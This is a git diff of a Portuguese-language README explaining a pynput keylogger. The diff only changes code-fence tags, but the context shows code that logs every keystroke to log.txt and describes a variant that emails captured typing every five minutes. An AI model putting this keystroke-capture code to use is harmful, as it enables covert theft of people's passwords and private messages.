@@ -5,7 +5,7 @@ Esse script é um keylogger básico feito com a biblioteca pynput.
 A ideia é simples: sempre que o usuário aperta uma tecla, o programa registra isso dentro de um arquivo chamado log.txt.
 
 ## 🔍 Parte 1: Lista de teclas a serem ignoradas
-```
+```python
 IGNORAR = {
     keyboard.Key.shift,
     keyboard.Key.shift_r,
@@ -27,7 +27,7 @@ ______________________________________
 Essa função roda toda vez que qualquer tecla é pressionada.
 
 - Primeiro caso: tecla normal
-```
+```python
 try:
     with open("log.txt", "a", encoding="utf-8") as f:
         f.write(key.char)
@@ -41,7 +41,7 @@ Bem direto ao ponto.
 Se a tecla NÃO tiver .char, o código cai no except AttributeError.
 
 Aqui você trata teclas como espaço, enter, tab, backspace, esc e por aí vai:
-```
+```python
 if key == keyboard.Key.space:
     f.write(" ")
 elif key == keyboard.Key.enter:
@@ -66,7 +66,7 @@ E se for uma tecla especial não tratada (como Key.f5, Key.home, Key.end, etc.),
 [Key.f1]
 ______________________________
 ## 🎧 Parte 3: Iniciando o “ouvinte”
-```
+```python
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
 ``` 
@@ -74,8 +74,6 @@ Isso inicia o listener do pynput, que fica rodando indefinidamente, chamando on_
 
 
 # Keylogger Email
-
-Explicação do código
 
 Esse script é um keylogger com envio automático por e-mail.
 Ou seja: ele registra tudo o que a pessoa digita e, a cada 5 minutos, envia o conteúdo capturado para um e-mail específico.
